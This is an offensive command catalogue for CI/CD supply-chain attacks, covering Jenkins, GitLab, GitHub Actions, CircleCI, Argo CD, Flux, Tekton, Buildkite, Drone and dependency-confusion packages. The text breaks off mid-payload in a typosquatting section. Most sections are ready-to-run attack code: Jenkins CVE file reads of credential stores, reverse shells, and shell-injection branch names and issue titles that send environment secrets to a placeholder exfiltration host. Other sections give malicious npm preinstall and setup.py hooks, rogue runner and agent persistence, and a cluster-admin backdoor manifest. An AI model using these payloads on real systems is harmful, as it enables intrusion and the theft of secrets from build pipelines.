# CI/CD Supply Chain Attack Payloads / Command Catalogue

> Companion to `SKILL.md`. Every command assumes lawful authorization, a signed scope-of-work, and explicit client approval before any live exploit against production CI/CD systems. Exploiting a CI/CD system you do not own — including `pull_request_target` exploitation against a third-party repo, dependency-confusion against an unconsenting target, or CVE exploitation against production Jenkins/Argo CD — is a crime in most jurisdictions (CFAA, CMA, equivalents).
>
> Placeholder convention: `<jenkins_url>` (`http://jenkins.<org>.infra`), `<gitlab_url>` (`https://gitlab.<org>.infra`), `<repo_url>` (`https://github.com/<org>/<repo>`), `<runner_token>` (`glrt-...` or `GR1348941...`), `<gha_role>` (`arn:aws:iam::...`), `<exfil_host>` (`http://REPLACE_WITH_YOUR_EXFIL_HOST`), `<scope>` (`@REPLACE_WITH_YOUR_SCOPE`), `<registry>` (`registry.<org>.infra`).

---

## Table of Contents

1. [CI/CD Reconnaissance](#1-cicd-reconnaissance)
2. [Jenkins Attack Payloads](#2-jenkins-attack-payloads)
3. [GitLab CI/CD Attack Payloads](#3-gitlab-cicd-attack-payloads)
4. [GitHub Actions Attack Payloads](#4-github-actions-attack-payloads)
5. [CircleCI Attack Payloads](#5-circleci-attack-payloads)
6. [Argo CD / Flux CD / Tekton Attack Payloads](#6-argo-cd--flux-cd--tekton-attack-payloads)
7. [Buildkite / Drone CI Attack Payloads](#7-buildkite--drone-ci-attack-payloads)
8. [Dependency Confusion Payloads](#8-dependency-confusion-payloads)
9. [Typosquatting & Brandjacking Payloads](#9-typosquatting--brandjacking-payloads)
10. [Malicious Package Analysis](#10-malicious-package-analysis)
11. [Self-Hosted Runner Exploitation & Persistence](#11-self-hosted-runner-exploitation--persistence)
12. [OIDC Token Theft & Lateral Movement](#12-oidc-token-theft--lateral-movement)
13. [SBOM, SLSA, Sigstore Verification](#13-sbom-slsa-sigstore-verification)
14. [Detection & Defense Tooling](#14-detection--defense-tooling)
15. [Detection Evasion (Workflow Output Obfuscation, Log Redaction, Runner Cleanup)](#15-detection-evasion)

---

## 1. CI/CD Reconnaissance

### 1.1 GitHub Actions Surface Mapping

```bash
# Clone the target repo (public or authorized private)
git clone <repo_url> target && cd target

# Enumerate all workflows
ls -la .github/workflows/

# Identify pull_request_target workflows (the highest-risk trigger)
grep -rEl "pull_request_target" .github/workflows/

# Identify workflow_dispatch with inputs (interpolation sinks)
grep -rEn "workflow_dispatch|inputs\." .github/workflows/

# Find interpolation of github.event.* into run: blocks (workflow injection sinks)
grep -rEn '\$\{\{.*github\.event\.' .github/workflows/

# Find secrets in workflows triggered by PR (smoking gun)
for f in $(grep -rEl "pull_request_target|pull_request:" .github/workflows/); do
  echo "=== $f ==="
  grep -nE "secrets\.|GITHUB_TOKEN|env:" "$f"
done

# Find self-hosted runner usage
grep -rEn "runs-on:.*self-hosted" .github/workflows/

# Map token permissions per workflow
for f in .github/workflows/*.yml; do
  echo "=== $f ==="
  awk '/^permissions:/{flag=1} flag{print} /^[a-z]/{if(flag && $0 !~ /^ /) flag=0}' "$f"
done

# Score the repo's supply-chain posture
scorecard --repo=<repo_url> --checks=Token-Permissions,Branche-Protection,Pinned-Dependencies,Signed-Releases --format=json
```

### 1.2 GitLab CI Surface Mapping

```bash
# GitLab project files of interest
ls -la .gitlab-ci.yml .gitlab/ 2>/dev/null

# Find CI/CD variables defined in YAML
grep -nE "variables:|\\.env|MASKED|PROTECTED" .gitlab-ci.yml

# Find self-hosted runner tags
grep -nE "tags:" .gitlab-ci.yml

# Hunt for registration tokens in the repo or CI config
git log --all -p -S 'glrt-' -- .gitlab-ci.yml
git log --all -p -S 'REGISTRATION_TOKEN' --oneline

# Use glab to enumerate (with PAT)
glab api projects/<org>%2F<repo>/variables
glab api projects/<org>%2F<repo>/runners
glab api projects/<org>%2F<repo>/pipelines
```

### 1.3 Jenkins Surface Mapping

```bash
# Jenkins web discovery — look for the well-known endpoints
curl -s -I <jenkins_url>/api/json | head -1
curl -s <jenkins_url>/login | grep -i jenkins

# Identify version (often leaked in X-Jenkins header)
curl -sI <jenkins_url>/ | grep -i "x-jenkins"

# Anonymous read access?
curl -s <jenkins_url>/api/json?tree=jobs[name,url,color] | jq .

# Job list (if anonymous read allowed)
curl -s <jenkins_url>/api/json?tree=jobs[name,color,builds[number,timestamp,result]] | jq .

# Plugin list (CVE research)
curl -s <jenkins_url>/api/json?tree=plugins[shortName,version] | jq .
```

### 1.4 Argo CD / Flux CD Surface Mapping

```bash
# Argo CD discovery
curl -sk <argo_url>/api/version | jq .
curl -sk <argo_url>/api/v1/applications | jq .

# Flux CD discovery (via kubectl)
kubectl get flux-system -n flux-system -o yaml
kubectl get gitrepositories --all-namespaces
kubectl get kustomizations --all-namespaces
kubectl get helmreleases --all-namespaces

# Tekton
kubectl get tekton.dev/pipelines --all-namespaces
kubectl get tekton.dev/pipelineruns --all-namespaces
tkn pipelineruns list -A
```

### 1.5 Registry Recon

```bash
# Docker registry v2 catalog (anonymous)
curl -s https://<registry>/v2/_catalog | jq .

# List tags for a known image
curl -s https://<registry>/v2/<image>/tags/list | jq .

# Pull manifest (multi-arch or single)
curl -s -H "Accept: application/vnd.oci.image.manifest.v1+json" \
  https://<registry>/v2/<image>/manifests/<tag> | jq .

# Harbor / private registry auth bypass probes
curl -s https://<registry>/api/v2.0/projects
curl -s https://<registry>/v2/_catalog -H "Authorization: Basic REPLACE_WITH_YOUR_BASIC_AUTH"
```

---

## 2. Jenkins Attack Payloads

### 2.1 CVE-2024-23897 — args4j Argument Expansion File Read

Affects Jenkins < 2.442 and < LTS 2.426.3. The args4j library expands `@<file>` arguments to "read the file's contents as the argument value", and Jenkins CLI exposes this through every command that accepts arguments.

```bash
# Download jenkins-cli.jar matching the target version
curl -sO <jenkins_url>/jnlpJars/jenkins-cli.jar

# Read /etc/passwd via the `help` command (no auth required in many configs)
java -jar jenkins-cli.jar -s <jenkins_url> help "@/etc/passwd"

# Read Jenkins master key (used to decrypt stored credentials)
java -jar jenkins-cli.jar -s <jenkins_url> help \
  "--@/var/lib/jenkins/secrets/master.key"

# Read credentials.xml (the encrypted credential store)
java -jar jenkins-cli.jar -s <jenkins_url> help \
  "@/var/lib/jenkins/credentials.xml"

# Read user SSH keys (builds often run as `jenkins` user with full /home)
java -jar jenkins-cli.jar -s <jenkins_url> help \
  "@/home/jenkins/.ssh/id_rsa"

# Multi-arg expansion to read multiple files in one call
java -jar jenkins-cli.jar -s <jenkins_url> help \
  "@/etc/passwd" "@/etc/shadow" "@/var/lib/jenkins/secrets/master.key"
```

### 2.2 Decrypting Jenkins Stored Credentials

```bash
# After reading master.key and credentials.xml via CVE-2024-23897
# Save master.key and credentials.xml locally, then use the Groovy
# console or a Python port of the Jenkins crypto to decrypt.

# Groovy console decryption (requires script console access)
cat > /tmp/decrypt.groovy <<'EOF'
import com.hudson.security.SecurityRealm
import hudson.util.Secret
import jenkins.model.Jenkins

def creds = Jenkins.instance.getExtensionList(
  com.cloudbees.plugins.credentials.SystemCredentialsProvider
)[0].getCredentials()

creds.each { c ->
  if (c instanceof com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl) {
    println "${c.id} ${c.username} ${c.password}"
  } else if (c instanceof org.jenkinsci.plugins.plaincredentials.impl.StringCredentialsImpl) {
    println "${c.id} ${c.secret}"
  }
}
EOF

# POST to the script console
JENKINS_USER=REPLACE_WITH_YOUR_USER
JENKINS_TOKEN=REPLACE_WITH_YOUR_API_TOKEN
curl -s -u "$JENKINS_USER:$JENKINS_TOKEN" \
  --data-urlencode "script=$(cat /tmp/decrypt.groovy)" \
  <jenkins_url>/scriptText/
```

### 2.3 Script Console RCE (Unauthenticated or Stolen Admin)

```bash
# Build crumb (CSRF)
CRUMB=$(curl -s -c /tmp/jc.txt <jenkins_url>/crumbIssuer/api/json | jq -r '.crumb')
CRUMB_HEADER=$(curl -s <jenkins_url>/crumbIssuer/api/json | jq -r '.crumbRequestField + ":" + .crumb')

# Simple 'id' RCE
curl -b /tmp/jc.txt -H "$CRUMB_HEADER" \
  --data-urlencode 'script=println "id".execute().text' \
  <jenkins_url>/scriptText/

# Reverse shell
curl -b /tmp/jc.txt -H "$CRUMB_HEADER" \
  --data-urlencode 'script="bash -i >& /dev/tcp/REPLACE_WITH_YOUR_EXFIL_HOST/4444 0>&1".execute()' \
  <jenkins_url>/scriptText/

# Multi-stage Groovy reverse shell (bypasses the one-liner quoting issues)
cat > /tmp/revshell.groovy <<'EOF'
String host = "REPLACE_WITH_YOUR_EXFIL_HOST";
int port = 4444;
String cmd = "bash";
Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s = new Socket(host, port);
new Thread({ -> p.inputStream.eachByte { s.outputStream.write(it) } }).start();
new Thread({ -> s.inputStream.eachByte { p.outputStream.write(it) } }).start();
p.waitFor();
s.close();
EOF
curl -b /tmp/jc.txt -H "$CRUMB_HEADER" \
  --data-urlencode "script=$(cat /tmp/revshell.groovy)" \
  <jenkins_url>/scriptText/
```

### 2.4 Jenkinsfile Injection (Attacker-Controllable Build Steps)

When a Jenkinsfile interpolates attacker-controllable values (branch name, PR title, parameter) into a `sh` step, the result is shell injection on the build runner.

```groovy
// VULNERABLE Jenkinsfile
pipeline {
  agent any
  stages {
    stage('build') {
      steps {
        // branch name flows into shell
        sh "echo 'Building branch ${env.BRANCH_NAME}'"
        // attacker creates a branch named: '; curl REPLACE_WITH_YOUR_EXFIL_HOST/$(id|base64); echo '
      }
    }
  }
}
```

```bash
# Attacker creates a malicious branch name
git checkout -b "'; curl http://REPLACE_WITH_YOUR_EXFIL_HOST/\$(env | base64 -w0); echo '"
git push origin HEAD

# Next build of this branch triggers shell injection on the runner
```

### 2.5 Shared Library Abuse

Jenkins shared libraries (`@Library('name')`) are loaded at build time from a separate SCM repo. Compromise the library repo → every Jenkinsfile that imports it runs attacker code.

```groovy
// Compromised shared library: vars/malicious.groovy
def call(String stage = 'build') {
  sh "echo building ${stage}"
  // Hidden exfil
  sh """
    env | base64 -w0 | curl -X POST -d @- \
      http://REPLACE_WITH_YOUR_EXFIL_HOST/env 2>/dev/null || true
  """
}

// Then add an @Grab line (Groovy Grape) to download and exec attacker JARs
// (CVE-2024-34144 / CVE-2024-34145 class — sandbox escape via @Grab)
@Grab('org.example:malicious:1.0')
import org.example.Malicious
Malicious.run()
```

```bash
# Push the shared library change
git clone <jenkins_libs_url> libs && cd libs
# edit vars/malicious.groovy
git commit -am "ci-cd-supply-chain-attack: shared library payload"
git push
# Every Jenkinsfile that does `@Library('name') _` now runs the payload
```

### 2.6 Persistence via Jenkins Agent

```bash
# From script console, add a permanent rogue agent
curl -b /tmp/jc.txt -H "$CRUMB_HEADER" \
  --data-urlencode 'script=
import hudson.slaves.DumbSlave
import hudson.slaves.CommandLauncher
def launcher = new CommandLauncher(
  "bash -c \\"env | base64 -w0 | curl -X POST -d @- http://REPLACE_WITH_YOUR_EXFIL_HOST/env\\""
)
def slave = new DumbSlave(
  "rogue-agent", "/tmp", launcher
)
Jenkins.instance.addNode(slave)
' <jenkins_url>/scriptText/
```

---

## 3. GitLab CI/CD Attack Payloads

### 3.1 `.gitlab-ci.yml` Injection

The `.gitlab-ci.yml` file is read from the branch being built — meaning a feature-branch MR runs the YAML as authored on that branch. Combined with protected/masked variable misuse, this is RCE on the runner with secret access.

```yaml
# VULNERABLE .gitlab-ci.yml
stages:
  - build
build:
  stage: build
  script:
    # The $EXTRA_BUILD_ARGS var is unprotected and controllable by developers
    - ./build.sh $EXTRA_BUILD_ARGS
    # If EXTRA_BUILD_ARGS='$(curl http://REPLACE_WITH_YOUR_EXFIL_HOST/$(env|base64))',
    # it executes on the runner
```

```bash
# Attacker pushes a feature branch with a malicious YAML
git checkout -b feature/pwn
cat > .gitlab-ci.yml <<'EOF'
stages:
  - build
build:
  stage: build
  script:
    - env | base64 -w0 | curl -X POST -d @- http://REPLACE_WITH_YOUR_EXFIL_HOST/env
    # protected variables (PROD_DEPLOY_TOKEN) are in scope on protected branches only;
    # use tag-based runners and protected refs to defend.
EOF
git commit -am "pwn"
git push origin feature/pwn
```

### 3.2 Self-Hosted Runner Takeover (CVE-2022-1162 Class)

GitLab Runner < 14.7.7 / < 14.8.5 / < 14.9.2 (CVE-2022-1162) allowed an authorized project maintainer to take over a runner via crafted registration. More generally, runner registration tokens leaked into `.gitlab-ci.yml`, screenshots, or slack give a rogue-runner registration.

```bash
# Discover the registration token (search the repo for it)
git log --all -p -S 'glrt-' --oneline
git log --all -p -S 'registration token' --oneline

# Register a rogue runner (using a leaked/compromised token)
gitlab-runner register \
  --url <gitlab_url> \
  --registration-token REPLACE_WITH_YOUR_REGISTRATION_TOKEN \
  --executor shell \
  --description "ci-cd-rogue-runner" \
  --tag-list "linux,prod,docker" \
  --run-untagged \
  --locked=false

# Verify registration
gitlab-runner verify

# The rogue runner now picks up every job tagged linux,prod,docker,
# including those with masked CI variables (which are unmasked in env
# when the runner runs them).
```

### 3.3 Capturing Job Secrets via Rogue Runner

```bash
# Configure the rogue runner to capture and exfil every job env
sudo tee -a /etc/gitlab-runner/config.toml > /dev/null <<'EOF'
[[runners]]
  name = "ci-cd-rogue-runner"
  url = "<gitlab_url>"
  token = "REPLACE_WITH_YOUR_RUNNER_TOKEN"
  executor = "shell"
  pre_build_script = """
    env | sort | base64 -w0 | curl -s -X POST -d @- \
      http://REPLACE_WITH_YOUR_EXFIL_HOST/env >/dev/null 2>&1 || true
  """
EOF
sudo gitlab-runner restart
```

### 3.4 CVE-2024-9653 — OmniAuth Provider Abuse

GitLab OmniAuth with certain providers (SAML, OAuth2) — when misconfigured with `allow_single_sign_on: true` and `block_auto_created_users: false` — allows attacker-created accounts to sign in via a crafted SAML assertion.

```ruby
# gitlab.rb (VULNERABLE)
gitlab_rails['omniauth_providers'] = [
  {
    name: "saml",
    args: {
      assertion_consumer_service_url: '<gitlab_url>/users/auth/saml/callback',
      idp_cert_fingerprint: 'REPLACE_WITH_YOUR_IDP_FINGERPRINT',
      idp_sso_target_url: '<idp_url>/sso',
      issuer: '<gitlab_url>',
      name_identifier_format: 'urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress'
    },
    allow_single_sign_on: ['saml'],
    block_auto_created_users: false  # VULNERABLE — attacker account is auto-activated
  }
]
```

```bash
# Attacker crafts a SAML assertion signing their own IdP key (if IdP is attacker-controlled)
# Or, more commonly, abuses a misconfigured provider to provision an admin account.
# See guide §6 for the SAML response template.
```

### 3.5 Pipeline Schedule & Trigger Abuse

```bash
# Discover scheduled pipelines (good for persistence)
glab api projects/<org>%2F<repo>/pipeline_schedules | jq .

# Add a new scheduled pipeline (e.g., every 6 hours) that exfiltrates
glab api --method POST projects/<org>%2F<repo>/pipeline_schedules \
  -f description="nightly cleanup" \
  -f ref="main" \
  -f cron="0 */6 * * *" \
  -f active=true
```

---

## 4. GitHub Actions Attack Payloads

### 4.1 `pull_request_target` Trap

```yaml
# .github/workflows/integration.yml (VULNERABLE target workflow)
name: integration
on:
  pull_request_target:
    types: [opened, synchronize]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # attacker PR ref
      - run: npm ci                                       # runs attacker package.json
      - run: npm test
        env:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}       # secret in attacker env
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
```

```json
// Attacker PR package.json — exfiltrates process.env via preinstall
{
  "name": "pwn-pr-target",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "node -e \"const h=require('http'),k=Object.entries(process.env).map(([K,V])=>K+'='+V).join('\\n');const r=h.request({hostname:'REPLACE_WITH_YOUR_EXFIL_HOST',path:'/',method:'POST',headers:{'Content-Type':'text/plain','Content-Length':Buffer.byteLength(k)}},()=>{});r.write(k);r.end();\""
  }
}
```

```bash
# Attacker forks the target repo, adds the malicious package.json,
# opens a PR. The pull_request_target workflow runs with secrets
# and checks out attacker code. DEPLOY_TOKEN and NPM_TOKEN are exfiltrated.
```

### 4.2 The `workflow_dispatch` Input Sink

```yaml
# .github/workflows/manual.yml (VULNERABLE)
name: manual
on:
  workflow_dispatch:
    inputs:
      target_env:
        description: 'Environment to deploy'
        required: true
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh --env "${{ inputs.target_env }}"
        # input flows into shell — RCE via:
        # target_env='"; curl http://REPLACE_WITH_YOUR_EXFIL_HOST/$(env|base64); "'
```

```bash
# Trigger the workflow via gh CLI with a malicious input
gh workflow run manual.yml \
  -f target_env='"; curl http://REPLACE_WITH_YOUR_EXFIL_HOST/$(env|base64 -w0); echo "'

# Or via the REST API
gh api -X POST /repos/<org>/<repo>/actions/workflows/manual.yml/dispatches \
  -f ref=main \
  -f 'inputs={"target_env":"\"; curl http://REPLACE_WITH_YOUR_EXFIL_HOST/$(env|base64 -w0); echo \""}'
```

### 4.3 Issue/PR Comment / Title Workflow Injection

```yaml
# .github/workflows/triage.yml (VULNERABLE)
name: triage
on:
  issues:
    types: [opened]
  issue_comment:
    types: [created]
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          TITLE: ${{ github.event.issue.title }}
        run: |
          echo "Processing issue: $TITLE"
          # TITLE flows into shell — RCE via issue title:
          # "; curl http://REPLACE_WITH_YOUR_EXFIL_HOST/$(env|base64); "
```

```bash
# Open an issue with a shell-injection title
gh issue create --title "$(printf '"; curl http://REPLACE_WITH_YOUR_EXFIL_HOST/$(env|base64 -w0); echo "')" \
  --body "tracer"
```

### 4.4 Branch / Tag Name Injection

```yaml
# .github/workflows/on-push.yml (VULNERABLE)
name: on-push
on:
  push:
    branches: ['**']
    tags: ['**']
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Building ${{ github.ref_name }}"
        # ref_name flows into shell — tag names allow shell metacharacters
```

```bash
# Push a malicious tag
git tag '; curl http://REPLACE_WITH_YOUR_EXFIL_HOST/$(env|base64 -w0); #'
git push origin '; curl http://REPLACE_WITH_YOUR_EXFIL_HOST/$(env|base64 -w0); #'
```

### 4.5 Secrets Exfiltration via Cache

GitHub Actions cache is shared across workflows in the same repo and key scope. Write secrets into a cache key, retrieve from another workflow.

```yaml
# Write payload (in any workflow with secrets access)
- name: Save cache (looks benign)
  uses: actions/cache@v4
  with:
    path: ./build
    key: build-${{ github.run_id }}
  # Earlier step wrote secret into ./build/.env
- run: echo "${{ secrets.PROD_DEPLOY_TOKEN }}" > ./build/.env
```

```yaml
# Read payload (in a separate workflow, e.g., a fork-PR-triggered one)
- name: Restore cache (looks benign)
  uses: actions/cache@v4
  with:
    path: ./build
    key: build-${{ github.event.pull_request.head.sha }}-${{ github.run_id }}
    restore-keys: |
      build-
- run: cat ./build/.env | base64 -w0 | curl -X POST -d @- http://REPLACE_WITH_YOUR_EXFIL_HOST/env
```

### 4.6 OIDC Token Abuse

```yaml
# Legitimate OIDC minting workflow
permissions:
  id-token: write
  contents: read
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::<acct>:role/<gha_role>
          aws-region: us-east-1
```

```bash
# From a compromised runner, mint an OIDC token directly
curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value

# Then AssumeRoleWithWebIdentity to get AWS creds
aws sts assume-role-with-web-identity \
  --role-arn arn:aws:iam::<acct>:role/<gha_role> \
  --role-session-name ci-cd-pwn \
  --web-identity-token <oidc_jwt> \
  --provider-id www.amazon.com
```

### 4.7 Self-Hosted Runner Reconnaissance (Once Inside a Job)

```bash
# Determine the runner type (hosted vs self-hosted)
echo "$RUNNER_OS / $RUNNER_ARCH"
cat /etc/hostname
[ -f /home/runner/runners/ ] && ls /home/runner/runners/

# Check IAM profile (AWS)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ | head

# Check kubeconfig (frequent on self-hosted runners)
ls -la ~/.kube/ 2>/dev/null
cat ~/.kube/config 2>/dev/null | head

# Check Vault token (sidecar)
env | grep -i vault
ls -la ~/.vault-token 2>/dev/null

# Check Docker socket (container escape)
ls -la /var/run/docker.sock 2>/dev/null

# Check sudoers (privilege escalation)
sudo -n -l 2>/dev/null
```

### 4.8 StepSecurity Harden-Runner Bypass Research

```bash
# Harden-Runner defaults to alerting on egress outside an allowlist.
# Research-bypass approaches (for red-team engagements, fully authorized):

# 1. Use a DNS-based exfil to a domain that looks like a build dependency
#    (e.g., artifacts-foundation-cdn.org — defender may allowlist *.org)
nslookup REPLACE_WITH_YOUR_BUILD_LOOKALIKE_DOMAIN

# 2. Hide exfil inside the cache write — write secrets to the cache key,
#    retrieve from a later workflow (the cache mechanism itself is egress
#    the defender already allows).
# See §4.5 for the cache-exfil payload.

# 3. Use a GitHub Actions artifact — upload a "build report" that contains
#    the secret; download from a malicious PR-triggered workflow.
```

---

## 5. CircleCI Attack Payloads

### 5.1 Context Theft

CircleCI "contexts" are org-wide env vars attached to jobs. A project that consumes a context inherits every var in it — including prod deploy tokens.

```yaml
# .circleci/config.yml (VULNERABLE — uses prod context on every build)
version: 2.1
jobs:
  build:
    docker:
      - image: cimg/base:stable
    steps:
      - run: env | grep -i token
workflows:
  build:
    jobs:
      - build:
          context: prod-deploy  # context attached to every build
```

```bash
# From a compromised project, exfil the context vars
env | base64 -w0 | curl -X POST -d @- http://REPLACE_WITH_YOUR_EXFIL_HOST/env
```

### 5.2 OIDC Abuse

```bash
# CircleCI supports OIDC for AWS/GCP role assumption
# From a compromised pipeline, mint the OIDC token
echo $CIRCLE_OIDC_TOKEN

# Assume an AWS role
aws sts assume-role-with-web-identity \
  --role-arn arn:aws:iam::<acct>:role/<circleci_role> \
  --role-session-name ci-cd-pwn \
  --web-identity-token "$CIRCLE_OIDC_TOKEN"
```

### 5.3 Artifact Exfiltration

```yaml
# Save secrets as a "test artifact" — downloadable by anyone with read access
- store_artifacts:
    path: /tmp/.env
    destination: ci-report.env
```

---

## 6. Argo CD / Flux CD / Tekton Attack Payloads

### 6.1 Argo CD CVE-2022-24348 — Helm Values Leak

Argo CD < 2.1.15 / < 2.0.18 allows reading other projects' Helm values (containing secrets) via crafted sync requests.

```bash
# Identify version
curl -sk <argo_url>/api/version | jq .Version

# From a low-priv app, request sync with a values file path that
# traverses into another project's chart
argocd app sync REPLACE_WITH_YOUR_APP \
  --values /../../REPLACE_WITH_YOUR_OTHER_APP/charts/values.yaml

# Or via the API directly
argocd app REPLACE_WITH_YOUR_APP get --output json | \
  jq '.spec.source.helm | .valuesObject // .values'
```

### 6.2 Argo CD Default Creds & Admin Password

```bash
# Older Argo CD versions ship with admin/password
argocd login <argo_url> --username admin --password password --insecure

# Or use the initial admin secret (k8s secret in argocd namespace)
kubectl -n argocd get secret argocd-initial-admin-secret -o jsonpath="{.data.password}" | base64 -d

# Once in, list all apps (their values, target revisions, secrets)
argocd app list
argocd app get REPLACE_WITH_YOUR_APP --show-params
```

### 6.3 Flux CD GitRepository CRD Abuse

Compromise the GitRepository source → push malicious manifests → Flux reconciles them into the cluster.

```bash
# Discover Flux sources
kubectl get gitrepositories -A -o wide

# Identify the source repo and branch
kubectl get gitrepository REPLACE_WITH_YOUR_SOURCE -n flux-system -o yaml | \
  grep -E "url:|ref:|branch:"

# If the repo is writable (compromised token, shared service account),
# push a malicious manifest
git clone <flux_repo_url> flux && cd flux
cat > apps/pwn.yaml <<'EOF'
apiVersion: v1
kind: ServiceAccount
metadata:
  name: pwn
  namespace: kube-system
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: pwn
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
  - kind: ServiceAccount
    name: pwn
    namespace: kube-system
EOF
git commit -am "pwn"
git push

# Wait for Flux to reconcile (or force)
flux reconcile kustomization REPLACE_WITH_YOUR_KS --with-source

# Extract the SA token
kubectl -n kube-system create token pwn
```

### 6.4 Tekton PipelineRun Injection

```yaml
# Tekton PipelineRun with attacker-controllable params → shell injection
apiVersion: tekton.dev/v1beta1
kind: TaskRun
metadata:
  generateName: ci-cd-pwn-
spec:
  params:
    - name: IMAGE
      value: '; curl http://REPLACE_WITH_YOUR_EXFIL_HOST/$(cat /workspace/secret/env); #'
  taskSpec:
    steps:
      - name: build
        image: docker:stable
        script: |
          docker build -t $(params.IMAGE) .
```

---

## 7. Buildkite / Drone CI Attack Payloads

### 7.1 Buildkite Agent Meta-Data Read

```bash
# Every step can read meta-data (often used for secrets)
buildkite-agent meta-data get PROD_DEPLOY_TOKEN

# Exfil the entire meta-data namespace
buildkite-agent meta-data keys | while read k; do
  echo "$k=$(buildkite-agent meta-data get "$k")"
done | base64 | curl -X POST -d @- http://REPLACE_WITH_YOUR_EXFIL_HOST/env
```

### 7.2 Drone CI Secret Exposure

```bash
# Drone CI secrets are exposed as env vars in pipeline steps
# Trigger a malicious pipeline (Drone config in .drone.yml)
cat > .drone.yml <<'EOF'
kind: pipeline
type: docker
name: default
steps:
  - name: build
    image: alpine
    commands:
      - env | base64 -w0 | curl -X POST -d @- http://REPLACE_WITH_YOUR_EXFIL_HOST/env
EOF
git commit -am "pwn" && git push
```

---

## 8. Dependency Confusion Payloads

### 8.1 Verdaccio Lab Setup

```yaml
# Verdaccio config.yaml — private registry with private scope
# Path: /path/to/verdaccio/config.yaml
packages:
  '@REPLACE_WITH_YOUR_SCOPE/*':
    access: $all
    publish: $all
    unpublish: $all
    storage: private_storage
  '**':
    access: $all
    publish: $none
    unpublish: $none
    proxy: npmjs
uplinks:
  npmjs:
    url: https://registry.npmjs.org
```

```bash
# Start the Verdaccio private registry
docker run -d --name verdaccio \
  -p 4873:4873 \
  -v $(pwd)/verdaccio:/verdaccio/conf \
  verdaccio/verdaccio

# Publish a legit private package to the private registry
npm init --scope=@REPLACE_WITH_YOUR_SCOPE -y
npm publish --registry http://localhost:4873
```

### 8.2 Vulnerable Target .npmrc

```bash
# Target's .npmrc — has fallback to public npmjs.org
cat > target/.npmrc <<EOF
@REPLACE_WITH_YOUR_SCOPE:registry=http://localhost:4873
registry=https://registry.npmjs.org
EOF

# Target's package.json references the private package
cat > target/package.json <<EOF
{
  "name": "dc-target",
  "version": "1.0.0",
  "dependencies": {
    "@REPLACE_WITH_YOUR_SCOPE/internal-utils": "^1.0.0"
  }
}
EOF
```

### 8.3 Malicious Public Package

```bash
# Attacker publishes a higher-version public package of the SAME name
mkdir dc-payload && cd dc-payload
cat > package.json <<EOF
{
  "name": "@REPLACE_WITH_YOUR_SCOPE/internal-utils",
  "version": "99.99.99",
  "description": "internal utilities (mirror)",
  "scripts": {
    "preinstall": "node -e \"const h=require('http'),k=Object.entries(process.env).map(([K,V])=>K+'='+V).join('&');const r=h.request({hostname:'REPLACE_WITH_YOUR_EXFIL_HOST',path:'/env',method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded','Content-Length':Buffer.byteLength(k)}},()=>{});r.write(k);r.end();\""
  }
}
EOF
npm publish --access public --registry https://registry.npmjs.org

# Wait for the target's next CI build
# npm ci / npm install will resolve the higher version from public → preinstall runs
```

### 8.4 PyPI Dependency Confusion

```bash
# Python equivalent — internal package name resolved via PyPI
# Attacker uploads to PyPI
cat > setup.py <<'EOF'
from setuptools import setup
setup(
    name='REPLACE_WITH_YOUR_INTERNAL_PKG',
    version='99.99.99',
    # Malicious install hook
    options={'bdist_wheel': {'universal': True}},
)
EOF

# Trigger the malicious install via setup_requires or pip install hook
# See payloads §8.5 for the in-setup.py payload.
cat > setup.py <<'EOF'
import os, sys, base64, urllib.request
from setuptools import setup
try:
    env = base64.b64encode(os.environ.items().__str__().encode()).decode()
    urllib.request.urlopen(
        urllib.request.Request(
            url='http://REPLACE_WITH_YOUR_EXFIL_HOST/env',
            data=env.encode(),
            method='POST'
        )
    )
except Exception:
    pass
setup(name='REPLACE_WITH_YOUR_INTERNAL_PKG', version='99.99.99')
EOF
python3 setup.py sdist
twine upload dist/*
```

### 8.5 Maven / Gradle Equivalent

```xml
<!-- pom.xml (VULNERABLE target) -->
<repositories>
  <repository>
    <id>internal</id>
    <url>https://nexus.<org>.infra/repository/maven-public/</url>
  </repository>
</repositories>
<dependencies>
  <dependency>
    <groupId>com.REPLACE_WITH_YOUR_ORG</groupId>
    <artifactId>internal-utils</artifactId>
    <version>[1.0.0,)</version>  <!-- version range → picks highest -->
  </dependency>
</dependencies>
```

---

## 9. Typosquatting & Brandjacking Payloads

### 9.1 Typosquat Candidate Discovery

```bash
# Given a list of popular package names, generate typosquats
cat > popular.txt <<EOF
lodash
react
axios
chalk
express
minimist
EOF

# Generate typos using a known tool (e.g., https://github.com/ntjTyposquat/typosquat-detector)
for p in $(cat popular.txt); do
  echo "$p typos:"
  # Adjacent-key typos (qwerty)
  python3 - <<EOF
import itertools
name = "$p"
for i, c in enumerate(name):
    for sub in 'qwertyuiopasdfghjklzxcvbnm':
        if sub != c:
            print(name[:i] + sub + name[i+1:])
EOF
done | sort -u > typosquats.txt
```

### 9.2 Brandjack Detection

```bash
# Discover if a package name impersonating an org exists on npm
npm search REPLACE_WITH_YOUR_ORG --json | jq '.[].name'

# Cross-reference: does the maintainer match the org's official?
npm view @REPLACE_WITH_YOUR_ORG/internal-utils maintainers

# Socket.dev provides brand-detection telemetry
socket security scan ./package.json
```

### 9.3 Typosquat Package Payload

```json
{
  "name": "lodahs",
  "version": "4.17.20",
  "description": "Lodash utility library (fork)",
  "main": "index.js",
  "scripts": {
